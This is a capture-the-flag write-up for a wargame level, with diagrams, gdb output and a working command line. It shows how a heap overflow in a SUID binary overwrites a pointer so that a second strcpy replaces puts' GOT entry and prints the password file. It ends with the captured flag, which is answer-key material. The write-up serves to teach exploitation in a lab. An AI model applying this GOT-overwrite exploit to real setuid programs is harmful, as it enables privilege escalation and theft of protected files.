# Level 7

Same recon as level0: SUID **level8**.

## Analysis

```c
char c[80];   // global

void m(void) { printf("%s - %d\n", c, time(NULL)); }   // prints c, never called

int main(int argc, char **argv) {
    int **a = malloc(8);  a[1] = malloc(8);
    int **b = malloc(8);  b[1] = malloc(8);
    strcpy((char*)a[1], argv[1]);     // unbounded
    strcpy((char*)b[1], argv[2]);     // dest is a pointer we can corrupt
    fgets(c, 0x44, fopen("/home/user/level8/.pass", "r"));   // flag into c
    puts("~~");                        // libc call through the GOT
}
```

The chunks land in order `a, a[1], b, b[1]`. The first `strcpy` is unbounded, so overflowing `a[1]` reaches `b[1]` and rewrites that pointer. The **second** `strcpy` then writes `argv[2]` to wherever `b[1]` now points.

> **Chained write.** Two `strcpy`s with no size check let us write anywhere: the first overflow picks where the second one writes. No format string needed.

Plan: point `b[1]` at the `puts` GOT entry, then let the second strcpy write `m`'s address there. `puts("~~")` then runs `m`, which prints `c` (the flag fgets just loaded).

`m` and `puts@GOT`:

```
(gdb) info functions
0x080484f4  m
$ objdump -R level7 | grep puts
08049928 R_386_JUMP_SLOT   puts
```

## Mental model: a pointer is a mailbox

Think of memory as a wall of numbered mailboxes. A pointer is a mailbox holding a note that says "go to mailbox #X". A pointer therefore has **two** addresses, and mixing them up is what makes this level confusing:

- **where the pointer lives** (the mailbox itself), e.g. `b[1]` sits at `0x804a02c`.
- **where it points** (the note inside), e.g. `b[1]` holds `0x804a038`.

`strcpy((char*)b[1], argv[2])` means: read the note in mailbox `b[1]`, go there, and write `argv[2]`. So if we change the **note** inside `b[1]`, we change where the second `strcpy` writes. We change it by overflowing the first `strcpy` until it reaches `b[1]`'s mailbox.

## Exploit

### Memory layout after the four mallocs

Every cell is 4 bytes. Real addresses from gdb:

```
  address       content        role
 +------------+--------------+------------------------------+
 | 0x804a008  |  0x00000001  | a[0] = 1                     |
 | 0x804a00c  |  0x0804a018  | a[1]  --> points to 0x804a018|
 | 0x804a010  |  0x00000000  |                              |
 | 0x804a014  |  0x00000011  | (chunk header)               |
 | 0x804a018  |  ????????    | a[1]'s chunk (8 bytes)       |  <- strcpy1 WRITES HERE
 | 0x804a01c  |  ????????    |                              |
 | 0x804a020  |  0x00000000  | (chunk header)               |
 | 0x804a024  |  0x00000011  |                              |
 | 0x804a028  |  0x00000002  | b[0] = 2                     |
 | 0x804a02c  |  0x0804a038  | b[1]  --> points to 0x804a038|  <- THE TARGET
 | 0x804a030  |  0x00000000  | (chunk header)               |
 | 0x804a034  |  0x00000011  |                              |
 | 0x804a038  |  ????????    | b[1]'s chunk (8 bytes)       |  <- strcpy2 WRITES HERE
 +------------+--------------+------------------------------+
```

- `strcpy(a[1], argv[1])` starts writing at **0x804a018** (where `a[1]` points).
- `strcpy(b[1], argv[2])` writes where **`b[1]` points**, currently **0x804a038**.

### Step 1: strcpy1 with `argv[1] = "A"*20 + puts@GOT`

The copy overflows from `0x804a018` and marches cell by cell. 20 bytes of `A` fill everything up to `b[0]`, then the 4 bytes `puts@GOT` (`0x08049928`) land exactly on `b[1]`:

```
 +------------+--------------+------------------------------+
 | 0x804a018  |  0x41414141  | AAAA   <- bytes 0-3          |
 | 0x804a01c  |  0x41414141  | AAAA   <- bytes 4-7          |   20
 | 0x804a020  |  0x41414141  | AAAA   <- bytes 8-11         |   bytes
 | 0x804a024  |  0x41414141  | AAAA   <- bytes 12-15        |   of
 | 0x804a028  |  0x41414141  | AAAA   <- bytes 16-19 (b[0]) |   padding
 +------------+--------------+------------------------------+ --------
 | 0x804a02c  |  0x08049928  | b[1] OVERWRITTEN = puts@GOT  |   <- the 4 useful bytes
 +------------+--------------+------------------------------+

   before:  b[1] --> 0x804a038  (an empty chunk, useless)
   after:   b[1] --> 0x08049928  (the GOT entry of puts!)
```

The padding is just the number of bytes between where strcpy1 starts and `b[1]`'s cell:

```
   0x804a02c  (b[1]'s cell)
 - 0x804a018  (strcpy1 start)
 -----------
   0x00000014  =  20
```

> Careful: the distance between the two *values* (`0x804a018` and `0x804a038`) is 32 bytes and is **not** what the exploit uses. The padding is the distance to `b[1]`'s **cell** (`0x804a02c`), which is 20 bytes.

Reading these addresses in gdb (the four chunks come back in `eax` one after another):

```
(gdb) b *0x08048550        # after a[1] = malloc(8)
(gdb) b *0x08048565        # after b    = malloc(8)
(gdb) run AAAA BBBB
Breakpoint 1 ...
(gdb) p/x $eax
$1 = 0x804a018             <- where strcpy1 starts
(gdb) c
Breakpoint 2 ...
(gdb) p/x $eax + 4
$2 = 0x804a02c            <- b[1]'s cell, the one we overwrite
(gdb) p/d 0x804a02c - 0x804a018
$3 = 20
```

### Step 2: strcpy2 with `argv[2] = &m`

`strcpy(b[1], argv[2])` writes where `b[1]` points, which is now `puts@GOT`. So `m`'s address (`0x080484f4`) lands in the GOT:

```
   GOT (table of libc function addresses)
 +------------+--------------+------------------------------+
 | 0x08049928 |  0x080484f4  | puts@GOT OVERWRITTEN = &m    |
 +------------+--------------+------------------------------+

   before:  puts@GOT --> real puts in libc
   after:   puts@GOT --> m  (0x080484f4)
```

### Step 3: puts("~~") runs

The program calls `puts`, looks up its address in the GOT, and finds `m` instead:

```
   puts("~~")  --reads GOT-->  0x080484f4  -->  m()
                                                 |
                                                 +-> printf("%s ...", c)
                                                          |
                                                          +-> c holds the flag (loaded by fgets)
```

### Who replaces who

```
 argv[1] --(strcpy1, overflows 20 bytes)--> replaces  b[1]      with  puts@GOT
 argv[2] --(strcpy2, writes via b[1])-----> replaces  puts@GOT  with  m
 puts("~~") --(reads the GOT)-------------> calls     m         instead of puts
 m --------------------------------------> prints    c         = the flag
```

Two writes in a chain: the first one chooses **where** the second one writes.

### Run

```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1776694943
```

- `argv[1]` = 20 padding + `\x28\x99\x04\x08` (puts@GOT) → first strcpy sets `b[1]` = puts@GOT.
- `argv[2]` = `\xf4\x84\x04\x08` (m) → second strcpy writes m into puts@GOT.
- `puts("~~")` looks up its address in the GOT → now runs `m` → prints the flag (the `- 1776694943` is `time(NULL)`).

Both addresses are null-byte-free, so they survive as command-line args.

Flag: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
